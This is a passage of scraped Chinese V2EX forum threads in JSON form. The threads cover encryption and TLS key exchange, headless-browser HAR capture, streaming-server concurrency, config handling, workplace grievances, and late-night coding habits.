"协商好秘钥之后的通信就用对称加密了\r", "这样子只需要服务端有一份公钥私钥对就可以了，通信秘钥是一次一密的", "明显错误用法\r", "发给谁就用谁的公钥加密，服务器不需要解密，原样转发即可\r", "还是说你就说想要偷看别人内裤而已？\r", "要发给服务器的数据，用服务器公钥加密", "\r", "可以看一下关于 IDS 和 iMessage 的部分。", "本地生成随机数作为对称加密的密钥  +  服务器公钥加密随机数   这两东西一起发送给服务器就行", "非对称加密不是用来直接加密数据的，和一楼说的一样用来做密钥协商，拿 DES 来说，可加密数据的长度和公钥的长度有关, 根本没法直接拿来加密数据。\r", "\r", "每个 client 和 server 在协商阶段生成一个随机字符串作为密钥，非对称加密用来加密这个密钥，实际数据用密钥进行对称加密。每个 client 的 server 之间的会话密钥只有他们两者知道，而又只有 server 的私钥能解密实际的会话密钥。 https 大概就这个过程，多了 CA", " 用非对称加密来传输对称加密用的密钥，好像可以解决问题， 但总感觉不是很赞啊", "非对称加密也可以用来加密数据。\r", "但是用法是反的：要给 A 发数据，那么用 A 的公钥加密，只有 A 的私钥才能解开。而 A 的私钥是只有 A 自己知道的。所以可以做到『任何一个人都可以给 A 发送只有 A 能解密的消息』。", " \r", "这里面很重要的一点是非对称加密算法普遍很慢，对称加密算法很快而且大部分有硬件指令加速。所以最终传输的数据大都是对称加密的。", " 对对对，我不偷看别人内裤，不过如果不是在发送消息的这个假设下，会不会有这种方式？", " 感谢感谢", "通信加密的话个人人为 OTR 比单纯的公钥加密更清真 \r", "我认为你应该尝试一下 OTR ，是专为这种情况设计的", " 清真是啥意思。。。 OTR 用的是 DH 算法交换秘钥，然后是 AES 对称加密，这种方式胜在轻，对报文比较友好，但是中间人攻击一直是问题；现在主流都是用 RSA 公钥来加密交换 AES 秘钥，缺点就是报文很重， https 就是这么做的。", " https 不是用自己的私钥加密的吗，看来一直都理解错了", "非对称密钥算法甚少用于直接加密消息。\r", "\r", "多用于密钥协商（使用对称密钥建立通信信道的时候，双方协商用什么对称密钥，关键字 “ DH 交换”），\r", "消息摘要和签名（验证消息的完整性和发送者的身份， 关键字 “ DSA ” digital signature algorithem ）", "这种需求就是端到端加密，中间节点都不可信，包括作为中转的服务端。同时还要考虑前向安全问题（ pfs ）。\r", "\r", "Whatsapp 、 Signal 好像已经支持。\r", "邮件的话许多客户端支持 pgp 。", "感觉你这个需求像 U 盾，客户端需要存一个私钥，比较麻烦。", " 赞", " 如果加密后在节点传递，节点不可信应该无碍吧？", "中间节点指的是 server host ，比如邮件服务、微信服务等。", " 请阅读\"Authenticated Key Exchange (AKE)\"段，仍有兴趣的话还可以了解下“ Socialist Millionaires' Protocol (SMP)”", "之前没看清你的要求，以为是想要端到端加密。实际上是对 TLS 理解不对，才会出现这种奇怪的想法。\r", "TLS1.2 握手过程主要是完成服务端身份验证以及 key 交换，这个 key 用于实际的加解密。如果需要对每个客户端也进行证书验证，可以要求客户端提供自己的证书。实际的加解密 key 是和某次会话关联的，即使同一个客户端，这个 key 也可能不同，所以并不存在你说的情况。\r", "TLS 支持 Static RSA 和 DH 两种方式实现 key 交换，前者用到了公私钥加解密，但存在 PFS 问题， TSL1.3 草案已经废弃。\r", "另外公钥不能解密私钥加密的内容，一般用于加密和验证（非对称）。", " 。。。 RSA 的公钥实际上也是拿来做 key exchange 的，你提到的这个协议做 ake 就是用的 DH 啊。。清真是说实现起来轻么？", " 你自然可以用 signature based 的 DH 如 ECDHE 甚至直接拿 RSA 签名也行,但是 OTR 比传统的非对称加密多提供 forward secrecy 和  deniable authentication 。 forward secrecy ，即前向加密，保证私钥泄露后，攻击者无法根据之前的通信记录恢复通信明文。 deniable authentication, 保证在认证过程中不会泄露私钥信息(具体通过 SMP 实现)。一个可以接受的做法是利用 NTRU 公钥加密 psk 然后通过 SMP 验证通信对端，然后利用 psk 生成一个临时信道完成密钥交换，但这种方法依旧不够清真。对比 NTRUSign,SMP 依旧不会泄漏私钥信息。目前最清真的方法比较复杂,比较关于 NTRU 的研究还不够充分，而且，你并不知道哪天会突然冒出来一个量子通用计算机。", " 对于群聊环境，你可以看一下 Muti-party Off-the-record(mpOTR)。\r", " 受教了，我好好消化下！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如何更好更轻量地在服务端获取 har （一个 URL 下所有元素的信息）？</p>\n<p>我需要的：\n例如：\n输入： <a href=\"http://www.163.com\" rel=\"nofollow\">http://www.163.com</a>\n获得：该页面里所有元素，例如图片、 js 、 css 等的信息（包括 header 、 size 、 dns 时间、连接时间、下载时间等等）</p>\n<p>试过的方案：\nphantomjs\n缺点：没有 dns 时间和连接时间</p>\n<p>chrome --headless --remote-debugging-port\n缺点：太庞大了，安装包 40+MB ，还依赖一堆，全套起来接近百兆</p>\n<p>我的服务端是对硬盘空间比较敏感的小型 linux\n请问，有没有比这两个方案更好更轻量（程序文件尺寸）的其它方案？</p>\n</div></div>"], "reply": "10", "tittle": "关于无界面浏览 web、headless、har、模拟浏览器", "comment": ["webtestpage ？", "打错了， 2333333\r", "webpagetest", "nightmare", "splash", " 单单“ webpagetest_3.0.zip ”就要 48MB 了，部署这套方案应该要接近百兆以上的磁盘空间了吧？ 还得需要安装 python 、 php?", " 它仅仅依赖 node.js 吗？ 还需要再安装别的东西吗？ 它能获取到每个元素的 dns 时间 connect 时间吗？", " splash 这个方案还要安装 QT 库和 python 吗？ 主要是 QT 库太庞大了", " 是的，但是他可以获取详细 har", " 但是你还可以直接用 docker ，不过看你具体要多小了", " sorry 没看清。这个还依赖 phantomjs"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>请问一下， V2EX 上有做音频直播服务器开发的童鞋吗？或者视频直播或 CDN 分发服务器的？</p>\n<p>请教一下：你们的服务器用普通 PC 机子（比如：酷睿 i7 4 核 主频 2.0HZ ，操作系统 Linux 4.x ?），单进程能支持到多少的并发 socket ，机子配置如何？</p>\n<p>我自己基于 RTMP 协议，用 objective-c 开发的单进程多线程模型的音频直播服务器，跑在酷睿 i7 4 核 主频 2.0HZ （机子 2012 年买的，可能已经不如现在的酷睿 i7 了， CPU 架构有所调整了），操作系统是 macOS 10.12 ，多路复用使用 poll （由于操作系统问题，没法使用更好的 epoll ），单进程能支持到 5k 个并发 socket ，这时 CPU 使用率已经快达到 70%（用户空间的 CPU 使用率接近 30%，系统空间的 CPU 使用率接近 40%），因为我只有一台机子，要同时跑服务器和客户端的测试程序，服务器支持 5k ，客户端也有 5k 的并发在跑，所以，如果机子只跑服务器程序的话，理想情况下可以达到 5k X 2 = 10k 的并发连接。。</p>\n<p>服务器程序，我已经尽量做到 zero copy 了，减少了很多内存间复制，基本上只从 socket read 一次（数据从内核到用户空间），然后解析包头，包体等数据基本做到 zero copy 了，个人感觉没有优化空间了。。</p>\n<p>服务器程序的 write socket ，使用 wrtitev 减少多次调用内核 write 函数（这样陷入内核软中断，进程上下文的切换会减少），感觉也没有优化空间了。。</p>\n<p>因为是音频服务器，所以个人感觉使用 poll 和使用 epoll 的差别不大了，因为一个主播如果有 10k 的收听，基本一个音频包，就要转发 10k 次，这时， epoll 返回精确的 10k 可写事件和使用 poll ，然后遍历 10k 次没多大分别，但按理来说， epoll 肯定会优于 poll （如果是普通的即时文本通讯服务器的话，可能会有 2 倍的提升，但对于音频服务器的话，提升不大）。。</p>\n<p>我开发的语言使用 objective-c ，函数的消息发送原理，内存的引用计数原理，感觉会带来一些额外过多的指令的执行，未如使用 c 开发的程序好。。</p>\n<p>后期，可能使用 c ，和 c++各开发一次，跑在 Linux 上，使用 epoll ，看看并发数能突破什么界限。。</p>\n<p>现在，感觉单机的并发数还是达到了我的理想，所以要开始写分布式了，进行服务器间的通讯。。</p>\n</div></div>"], "reply": "1", "tittle": "关于音频直播服务器的并发数？", "comment": ["rtmp 分发对服务器有一定要求啊，我前两年自己弄了模转数 rtmp 后面云服务器端分发最终还是全 hls 实现的，毕竟对于客户端就能实现基本上毫无要求了……"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>不标题党 你们会点开看么？</p>\n<p><a href=\"https://www.qcloud.com/community/article/323436001490098149?fromSource=gwzcw.58311.58311.58311\" rel=\"nofollow\">深入理解 CPU 和异构计算芯片 GPU/FPGA/ASIC （上篇）</a></p>\n<p><a href=\"https://www.qcloud.com/community/article/35505001490098107?fromSource=gwzcw.58310.58310.58310\" rel=\"nofollow\">深入理解 CPU 和异构计算芯片 GPU/FPGA/ASIC （下篇）</a></p>\n</div></div>"], "reply": "1", "tittle": "深入理解 CPU 和异构计算芯片 GPU/FPGA/ASIC", "comment": ["这哪里深入了。。。裤子还没脱完就片子就结束了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前能想到的办法是：\n在每个模块里面 import 一个 utils 方法，然后调用，比如 set_vars(<strong>module_name</strong>)\n方法外面统一传入模块名，方法里面根据模块名读取 ini 然后把变量值赋给模块下面的变量</p>\n<p>感觉还是太丑陋了,想看看各位有没有好一点的建议</p>\n</div></div>"], "reply": "4", "tittle": "每个模块都要读取各自的 ini 文件初始化一大堆变量，有没有办法把它抽象出来？", "comment": ["configParser 不是有现成的模块吗", "我以前的做法是  建一张表 呵呵  config_key, config_value, config_type 三个字段足以 当然你还可以再加 add_time, last_update_time 之类  如果是客户段 搞个 sqlite 多 happy  下次配置修改或者升级 直接拷贝 \r", "\r", "或者是链接远程的 一个接口 读取表里所有数据", "没看懂问题是啥？\r", "如果是公共的配置那不是应该抽象出公共配置管理器来读么，然后每个模块里包含共有配置和私有配置。\r", "ini 里不是有 section 可以用来区分模块么。", " 恩 就是我觉得太恶心了\r", "\r", "我给你举个例子：\r", "client.py\r", "\r", "client_cp = configParser(\"client.ini\")\r", "var_1 = client_cp.get(\"var_1\")\r", "var_2 = client_cp.get(\"var_2\")\r", "..................\r", "var_50 = client_cp.get(\"var_50\")\r", "\r", "\r", "\r", "\r", "server.py:\r", ".............."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>背景</h1>\n<p>去年 3 月份经熟人推荐去了一家'创业'公司。公司主营是硬件产品，而且没有软件背景，而我是做软件的。当时去之前熟人说了一堆 balabala 的很心动也很相信他。熟人告诉我说：“那个公司项目还是刚起步，后面团队会慢慢壮大、齐全的。“</p>\n<p>有了熟人的担保之后，我去签合同的时候也没有多问现在的老板什么问题，就把合同签了。合同内容其实按道理也还凑合，第一年工资做底薪，第二年增长 50%，第三年增长 100%。入职有入职补贴 xxK ，除了底薪低，钱也不算少。当时除了我之外还有其他几个同学兼同事，都是在一起工作过 1-2 年的，大家待遇业差不多。\n当然选择这个公司的，最最主要的原因是离我家近。其次就是没有加过班，上班也是 955 ，中午有一餐饭。</p>\n<p>上面看上去很美好么？？？看下面</p>\n<hr>\n<h1>情况</h1>\n<p>入职之后才知道公司总共就 10 个左右，还是我们几个一起进去之后的人数。\n头几个月，我们都感觉公司还不错，起码项目不紧迫，给了自己足够的时间。\n但是后面几个月的时候我慢慢发现几个问题了：</p>\n<ol>\n<li>老板从来不开会，不合我们谈什么。项目内容也就偶尔聊几句。从来不在办公场合讨论项目进度和相关问题。</li>\n<li>老板对于成本控制特别扣。</li>\n<li>老板根本不信任员工，不放权。</li>\n<li>没有项目经验</li>\n<li>根本没打算招人</li>\n<li>无视应用软件的重要性</li>\n</ol>\n<p>由于我是做后端的，而公司除我以外没有软件工程师了。\n在我入职的二个月（当年 4-5 月）的时候向老板提出了申请，申请招聘至少一名前端配合我们一起完成产品的开发。老板口头上答应了几句，之后再也没有后文。\n几个月之后（当年 7-8 月）我再次向老板提出申请，并且按照他的要求提交纸质说明文档，依旧没有下文。</p>\n<p>当然在此期间，我也带着慢慢做一些前端工作，同时配合硬件同事完成调试。</p>\n<p>转眼就快到年底了。年关将至，有一天老板突然说，改天我们一起坐下来开个会讨论一下项目问题。然而不了了之。\n然后我继续向老板提出扩招的请求，这一次老板算是答应了，说招一个，但是任务却落到了我的头上。当我问他说，薪资待遇又什么限制的时候。他直接告诉我，这个就不该你管了。当时我也就笑笑。然后就开始了招聘工作，人都是靠朋友推荐或者网上找的。当面试的一个有一个的过来的时候，都是老板去和面试的人打交道。但是连续面了 3 个全都拒绝之后，又没了下文。</p>\n<p>这下好了，过年放假了。</p>\n<p>转眼年后，已经是快到了第二年，但是第二年是不是又什么事情要发生啊？是的，待遇要按照合同实行了。然后老板稳如泰山，依旧没有会议，没有通告。</p>\n<p>如今我已经提交了辞职。</p>\n<p>最近终于听到了要提待遇的风声了。但是已经和我没有关系了。当然这个提待遇，其实也是被我逼出来的吧。老板单独和其他人聊过，除了我。聊的内容我也知道，稳定其他人的心态。</p>\n<hr>\n<h1>问题</h1>\n<p>关于我，我平时在公司基本上不会私下 BB 什么。最多就是和同事讨论技术问题。倒是有其他人在 BB 什么。\n最后离职的时候，我已经尽我所能把我能做的做了，毕竟人少，任务多。</p>\n<p>现在就坐等新人来交接。但是我就怕，这个人一直不来，我交接不了，公司不让我走怎么办？</p>\n</div></div>"], "reply": "15", "tittle": "这种情况下，我不跳槽是不是有点傻？", "comment": ["卧槽，还以为谁帮我发了帖子，简直要和我公司一毛一样了，坐看楼下高见", "要不...去知乎看看?", "1#也许同一个公司？", " 不是，我公司老板稍微好那么一些，会开会。其他就差不多了。。。而且歧视 PHP 这个世界上最好的语言", " 居然歧视世界上最好的语言！不能忍！", "你们公司......真的是在专门做软件吗？怎么感觉背地里有什么其他用途呢？太奇怪了！", " 开头就说明了，公司主营硬件，根本不 care 软件。我现在都怀疑，当初招我进去的目的是什么。", "走得快好世界", " 抱歉抱歉，读得快了点。\r", "老板是不是在拿你们掩饰什么，诡异诡异", "辞职信只是告知，而不是申请，所以不需要公司同意，让你走你才能走\r", "打印辞职报告， EMS 发给老板，在快递上写明投递的是辞职信，并保留好自己的单据\r", "EMS 签收（拒收都行） 1 个月后直接走人即可。", "傻不傻完全取决于你下一份工作能找咋样的，毕竟好坏都是相对的。", "十个人做硬件, 赚到钱了吗", " 开会都不开，平时都不说话。你能从中套到什么消息？\r", "\r", "另外不管几个人，做什么。哪怕是 1 个人倒买倒卖都能赚钱，何况十个人！", "我们公司也主做硬件,网站开发部之前嫌工资少都走光了.老板不懂软件,也不喜欢你提建议,反正他就这么一说,你去做就好了.没产品经理啥的,全靠你自己去弄,也不管实现难度什么的.还老是嫌你不干活", " 没错，看来所有没有软件技术背景的公司都是一样。除非老板有魄力。\r", "\r", "如此的话，也就是随大流，选择离开了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>本人 iOS 开发，去年年初入职本公司，今年到期后又签了一年， 一年之中做出一个项目， 前后端都是我自己，但是，好像公司的下一个项目要外包出去了， 领导说就要我负责后期维护及管理，我该怎么办，我 iOS 看着自己的项目被包出去， 这样不好吧</p>\n</div></div>"], "reply": "10", "tittle": "我该如何", "comment": ["潜台词是对你做的项目不满意，直接开除你又不太好，暗示你该走人了，赶紧找下家吧。", " 这样子？我感觉条件这么艰苦的环境下我做的已经不错了啊", " 努力不代表能力", "你的不错对别人了来说不一定是不错", "下一个项目比较大一个人做不了？\r", "如果想继续做开发的就跳槽吧", "感觉没啥，这种不是跳槽的理由", " 领导说了让我做移动端的组长啊， 这样走了，好不好啊", " \r", " 你们这样是说我不行咯， 好无辜啊", " 我在犹豫， 要不要把 iOS 项目留下", "你自己的项目当然要打包一份走, 领导说让你当组长, 那只是让对方遇到不明白的地方可以找到你询问,毕竟代码都是你写的, 你就这样走了, 你领导不焦虑啊"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>2017 全球机器学习技术大会！！！</p>\n<p>6 月 29-30 日，北京金茂万里酒店，北京东城区王府井大街 57 号。</p>\n<p>大会讲师：</p>\n<p>Chris Monberg ， Boomtrain 联合创始人，技术总监。</p>\n<p>洪亮劼， Etsy 数据科学主管，前雅虎研究院资深科学家和高级研发经理。</p>\n<p>Adam Gibson ，人工智能公司 Skymind 联合创始人，技术总监，开源框架 Deeplearning4j 创始人。</p>\n<p>彭垚，七牛 AI 实验室创始负责人，七牛云技术总监。</p>\n<p>林晖，英语流利说首席科学家，联合创始人，曾任 Google 总部研究科学家。</p>\n<p>………………</p>\n<p>注册送大会 PPT 地址： <a href=\"http://t.cn/R6N4CnE\" rel=\"nofollow\">http://t.cn/R6N4CnE</a></p>\n</div></div>"], "reply": "11", "tittle": "全球机器学习技术大会！注册送大会 PPT !!!", "comment": ["这票价。。。反正我是买不起", "  可以向公司申请参加~", " #2 你知道一个月挣多少钱吗?", "界面 99%都是中文啊，面向全球 or 圈钱？", "票价很给力 。。", " 别逗了", "这是圈钱吧.", "所以办会议真是赚钱啊", "又是你们.", "\r", "\r", "楼主真是没底线没情操没道德。\r", "\r", "“注册送大会 PPT ” 这句话是玩弄大家感情吗？\r", "\r", "我实际走过流程，跟大家说一下：\r", "\r", "1 ，微信扫描，获取你的微信号信息\r", "2 ，填写真实姓名，电话，电邮，公司，职位各种隐私信息。\r", "\r", "按道理这就是“注册”完了吧？！\r", "\r", "不，他说，还差一步，还要关注他们的公众号，然后回复 PPT, 就告诉你怎么得到 PPT\r", "\r", "好，反正就差一步了，我关注，回复 PPT, 然后得到的消息是：\r", "\r", " [大会 PPT 获取流程] \r", " 1.分享大会链接（ ", "\r", " 2.在公众号里回复该截图，即可获得 PPT 领取资格。\r", "\r", "你可真会玩人，马上取关，爱坑谁坑谁去。你把流程开始就说清楚，我开始就不会去注册。", "这个人又来发贴忽悠人了"]},
{"content": ["<div class=\"topic_content\">cs 文件\r<br><a target=\"_blank\" href=\"http://pan.baidu.com/s/1eSopTFs\" rel=\"nofollow\">http://pan.baidu.com/s/1eSopTFs</a>\r<br>\r<br>游戏图片\r<br><a target=\"_blank\" href=\"http://pan.baidu.com/s/1migCigw\" rel=\"nofollow\">http://pan.baidu.com/s/1migCigw</a>\r<br>\r<br>当然用了自定义类库，需要类库得，请留言</div>"], "reply": "5", "tittle": "写了一个游戏，没有用一个循环，只有 160 几行代码", "comment": ["...为毛都不是 github.... pan.baidu 的风格好怪异", " 这个不重要，重要得是没有一句循环", " 没有循环又不是可以推广和借鉴的, 玩玩可以", "没有循环，一个迭代。要少写。包括循环语句。和对象的转换语句。强制类型转换。基础的查找。这些。都可以不用写。所以。第一百行代码。可以少写。五十行代码左右。你觉得呢？", "最重要。这是。他。把。需要使用的数据。和。能够提供的数据。彻底剪除相关性。这样需要维护的代码会少很多。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>就是那些图片分享的站点，我很明显的记得迅雷里面有各种图， 然而我忘记叫什么了，如果你手中有资源，请分享- -。</p>\n</div></div>"], "reply": "3", "tittle": "我想用爬虫抓取一些图片，你有网址推荐吗？", "comment": ["汤不热啊", " ?", "  老司机 要开车了么"]},
{"content": "", "reply": "7", "tittle": "CCF 会员有什么特殊加成吗？普通人可以加入 CCF 吗？", "comment": ["每年交 100 不就是会员了么，没啥用吧", "差点看成 CF 会员", "没有；可以；", "总觉得啥卵用没有 : )", " cf 会员不用钱", " ? haha"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>坐等 :&gt;</p>\n</div></div>"], "reply": "15", "tittle": "明天就是愚人节了，有没有各大厂商的节目清单呀？", "comment": ["据说明天愚人节，你们明天都不用上班，那么我们就走着瞧了[微笑]朋友圈见", "阿里的云计蒜\r", "豌豆荚的手机变飞机", "菜鸟裹裹的萌急送，看起来像是愚人节产品，不过也不排除真的推出这个产品", "百度收购谷歌搜索项目", "请看新闻联播", "360 的护身符那个不知道是真的还是愚人节，不过真的好像也不是太惊讶", " 微软收购百度", "无法理解这个节日的意义何在", "新浪微博，实时热搜榜，已经上线", "谷歌地图", "比较期待暴雪的", "那些年互联网公司的愚人节视频\r", "\r", "Smartisan OS v3.5.0 开始公测，本次更新新增 10 项实用功能。主要有：黑名单收费放行、伪造来电、势利眼功能、系统语言乡愁模式、防剁手选项、触感牙签等。今天我们将该版本随机推送给 515 位 Smartisan M1 手机用户，期待您的反馈。", "多看的进入界面颠倒了： P", " 我今天还以为手机拿反了呢😂"]},
{"content": ["<div class=\"topic_content\">- 我本身没有这样的特点。白天晚上效率一样。\r<br>因此问各位大牛，晚上效率高，同时白天效率很低的，到底怎么想的?\r<br>- 是因为白天没激情码代码吗？</div>"], "reply": "67", "tittle": "为什么晚上码代码效率高?", "comment": ["因为白天开会，不开会的时候每 10 分钟都有个人来问你问题", " 哈哈哈 厉害了", "因为白天在公司敲代码，晚上在家里敲代码。\r", "在公司的时候想着怎么偷懒，在家里的时候想着怎么把在公司偷的懒补回来。", "3 楼正解", "因为洗了个澡", "我想问的是，白天怎样才能有晚上的那种效率", "因为进了贤者时间", "我也觉得洗澡是一个有意思的答案。亲测有效", "乱七八糟的事情太多，噪音也多，能玩的也多……大半夜刷个微博或者票圈都半天没一条，只能敲代码了", "白天能持续专心写代码的时间不会超过半小时就会有人来打断你", "白天，姑娘们讲话太大声，闹腾，没心思工作。\r", "晚上，姑娘们下班了，静下心了，把白天的活补上去。", "睡眠分为 5 个阶段，经历前面的阶段才能进入最深层的睡眠，如果半夜被人吵醒了，那么就要重新经历各个阶段入睡到最深层，多次被吵醒，第二天起床就会精神萎缩，好无神气，效率低下。\r", "编程，亦是如此。", "安静的时候才效率高->戴耳机的时候效率高", "白天:\r", "老板:吧啦吧啦吧啦\r", "大客户:吧啦吧啦吧啦\r", "美工:吧啦吧啦吧啦\r", "快递:吧啦吧啦吧啦", "专注的时候效率才高呀", " 晚上也有姑娘怎么办", "因为对白天的碌碌无为感到羞愧而在晚上奋发图强", "白天啊，喝瓶酒就有状态了呗", "不应该是心情好,效率就高的嘛 ?", "赶紧脉动回来吧，题主", "剩下的体力值睡觉前不用掉太可惜", "因为白天没有好好工作的内疚之心在驱使着你", "可能脑子好使点了？感觉深夜学东西比较快吧", "想问为什么女装代码效率高", "因为程序猿都喜欢修仙…", "我很好奇为什么我在晚上 12 点过后就思如泉涌，白天苦思不得其解的问题，一到这个时间段就大概能想到解决方案。思来想去，还是跟 3 楼所说的一样。白天总感觉这一天还长，时间还多，慢慢来，结果 一天就莫名其妙地过去了，而晚上这个时间段，如果不逼着自己快点，不然连觉都没得睡。", "白天旁边 team 几十号人把整个区当作公共会议室还怎么有效率?\r", "别问怎么不发 complaint,他们老板比谁都能逼逼", "主要是单身吧，要是有个女朋友，你能好好写代码吗？", "白天碌碌无为的负罪感", " \r", "\r", "1 、白天太吵了，而且各种事儿打断思路\r", "2 、白天的时候眼镜除了能看到电脑屏幕，还有周边的各种干扰，影响注意力；晚上只有电脑屏幕亮着，周围全黑，更有助于集中注意力", "下雨天效率更高哦", " 好像不能，已经两个月没在家写代码了，我啥时候才能把自己的小项目写完呢……", "我白天效率比晚上高很多 晚上就不想搞了", " 大赞，女朋友会烦得你根本没法安心写代码或者打游戏", "白天都用来聊天喝咖啡开会健身了。。。\r", "晚上就很有负罪感 赶快把该写的代码补回来", "大办公室，白天一群老娘们叽叽喳喳的砍八卦，哪能集中精力写代码", "因为拖延之后的负罪感", "如果有性生活的话。。。。这个会不会也一样？", "   一到晚上，就开始进入贤者时间", " 。。。。我笑出来了。。", " \r", " \r", "买个入耳式的或者降噪的耳机，打开 Noisli", " 因为自带白噪音吗 233", "晚上回去老婆各种撒娇～～", " 所以晚上效率高的都是单身🐶。。。。", "晚上, \r", "HR 下班了, \r", "PM 因为客户的关系也开始划水或者下班了,\r", "而单身的你也终于有时间把白天完不成 /不合理的进度补回来了", "从来都是 deadline 之前效率最高....不分白天晚上", "晚上安安静静，思维也比较缜密？", "白天为公司写代码\r", "\r", "晚上为自己写代码", "没人打扰", "我现在也是这样 自从自由了以后 都是昼夜颠倒 白天很难集中精力 我这里不算很吵 但是就是集中不了精力 听着音乐也不行 但是晚上的时候 再困都能写下去代码 天一亮即时稍微有点睡意也撑不住\r", "(估计是变异了 XD) 以后会不会进化出一种生物叫做程序猿 XD", "白天在公司环境和晚上环境不一样。", " 你需要 MDR-1000X + 一个“请勿打扰”的牌子放在你的桌子上。", "难道不是被白天一事无成的内疚感驱驶着提高效率么", "单身！", " 把公司的窗帘拉起来,灯关掉,每人一个独立空间,配发零食,耳机,舒服的椅子", " 哈哈哈  可惜选择锻炼,来提高健康值,以后和女一走 good end 啊", "晚上大家都各自忙了，没人烦扰。大脑自得清净。效率就会奇高。", "那有些人喜欢听摇滚来写代码又怎么解释", "赶着写完睡觉(¦3ꇤ[▓▓]", "一方面是习惯原因吧，另一方面晚上比较安静，不容易被打断，写代码比较有感觉，这纯属本人自己的感觉*_*", "因为你想快点写完去睡觉... 所以效率高点..（跑", "因为可以裸体敲代码", "因为罪恶感", "我现在全天效率都差不多了，除非特别困的时候。经常不知不觉就到了吃饭时间了，不知不觉一天过去了。", "因为白天庸庸碌碌的负罪感...\r", "晚上躺床上又开始深思人生.然后睡不着了又起床稍微做点事", "晚上写代码 能睡得着吗。。", "因为没有女朋友"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>作为一个普通的程序员，没有一个个人的全栈项目，总感觉哪里不对劲，如果我要做这么一个项目，需要准备些什么？</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "如何开发一款全栈型项目？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>涨了点，还算可以，买一年的同学小赚了。<a href=\"https://intl.aliyun.com/zh/starter-packages/general\" rel=\"nofollow\">传送门</a></p>\n<p><img alt=\"Aliyun\" src=\"http://chuantu.biz/t5/55/1491014465x2728329094.png\"></p>\n</div></div>"], "reply": "1", "tittle": "所以，阿里云还是小涨回来了。", "comment": ["你要点进去看，分地区的\r", "便宜的都是欧洲和美洲地区，香港的贵"]},
{"content": ["<div class=\"topic_content\">呃 如题。\r<br>\r<br>有哪些开源方案可以组合起来实现，包含爬虫 存储 检索 排名算法。\r<br>只定向收录一些网站即可。</div>"], "reply": "6", "tittle": "搭建一个技术类的垂直搜索引擎有什么方案？", "comment": ["爬虫得自己写，搜索可以用 ElasticSearch 。", "自定义爬虫 + ES\r", "规模几十 T 不是问题", "垂直搜索的问题不是你底层抗不扛得住 是你抓别人数据能抓多少\r", "你能想到的可以聚合的内容基本都有反爬虫设计", "你需要的是:\r", "\r", "1. scrapy 抓\r", "2. elasticsearch 搜", "最简单的， google 自定义搜索，直接限定域名，哈哈", "  自己用倒是可以"]},
{"content": ["<div class=\"topic_content\">是这样的, 小生工作接近 4 年了, 目前从事手游行业的服务端, 主要码 php\r<br>\r<br>13-15 年, 都是在比较小的企业, 十来个人的团队, 也是从事手游. \r<br>\r<br>16 年年初来到了目前的公司, 当时税前薪资 13K, 五险一金都是按照最低的来买, 我是被分配到一个休闲产品部门.\r<br>\r<br>当时部门最鼎盛的时候有 30 个人左右吧, 我的直接上级是一个比较有经验的 phper, 从事了 8 年左右.\r<br>\r<br>16 年是最忙事情最多的一年, 什么优化重构高可用都在这一年给做了, 但后来说绩效考核要跟项目的 KPI 挂钩, 于是这一年我得了两个 B,  直接上级给部门领导的建议都是 A.\r<br>\r<br>16 年年末, 我直接上级离职. 部门从其他地方调来一个写 H5 的人做我直接上级, 这个说实话, 我的确不能接受, 哪怕是他任职年限比我长, 我向直接上级汇报工作还会被他抢功劳, 刚来到这里连 linux 的 cd 是什么意思都不知道也有资格当领导?\r<br>\r<br>17 年上半年项目收益下降, 部门也缩减人员, 领导要把我调到一个公共部门, 也就是一对多的关系, 到了那边也是做小弟, 而且没有归宿感, 说是说的好听说支撑的项目做得好会分我奖金, 问题是我在现在的部门一年多了, 奖金根本只听过, 没摸过. \r<br>\r<br>======\r<br>\r<br>总的来说, 我觉得我在这公司没有收到重用, 做的事情领导都看不到眼里, 普调也分毫没有增加工资, 绩效她妈的还要根据运营经营的项目来做指标考核, 你倒是来考核我代码的质量啊!!!\r<br>\r<br>所以我想离职了, 各位怎么看?</div>"], "reply": "17", "tittle": "请教各位大牛一些非技术上的问题", "comment": ["离职，下一题。", "你都把答案说出来了还要问别人吗", "php 是最好的语言", "骑驴找马 不用多说", "以提问的形式发牢骚吐糟求安慰蔚然成风", "你不是已经有答案了。只是心有不甘，想发泄而已。即使大家都认为你可以离职了，你还是会心里不自在。", " 是心有不甘, 毕竟在项目最鼎盛付出最多的时候竟然都拿了个 B, 服务器稳定, 游戏响应快, 这才是我应该做的事情, 开发还跟游戏收益挂钩, 这算什么? 那运营策划的 KPI 又怎么定呢...", " 确实是心里已经 有了答案, 不过我也只是想换做是你们是不是也会做一样的选择?", " 暂时不想骑驴找马, 还是等离职了准备一下再从长计议好点", " 并非想要寻求安慰, 只是想看各位的做法能否借鉴", " #7 这个问题稍微有点钻牛角尖 你更多不服的是绩效给了个 B, 至于 kpi 收益问题这个是跟全公司挂钩的吧.\r", "如果公司都没钱了拿什么给你发呢. 对吧. 你自己做的好是没用的.\r", "不过反回来说如果公司整体收益高的话运营肯定是头功 这个是在老板眼里的最正确的利益分配.\r", "我现在也在一个运营驱动型公司而不是技术驱动型公司 很能体会你的现状.\r", "不过我也要离职啦.\r", "最后再说一句是否离职取决于衡量你的能力能不能在其他公司得到更好的发展和收入 如果能为什么不走呢?", "公司按自己的收益情况发钱感觉没毛病。价值观不合就辞呗", " 看你找工作能力了 普通人还是骑驴找马心理压力比较小", " 实际上是有收益的, 只是领导的主观想法比较强, 无论是评级还是调薪, 都不公平", " 也是, 毕竟今年游戏行业就业都比较紧张", " 感谢你那么用心回答. 公司公司部门都有赚钱的, 只是普通员工看不见钱而已.  \r", "你说的对, 我更多是看重绩效, 这个指标就好比你做的事情, 领导 有没有看在眼里, 我并非要他加工资, 但他的各种不合理的决定真的让人心寒, 单是让 H5 带服务端, 还把我掉到公共部门想要逼走我, 这两点我都彻底对这里绝望了. 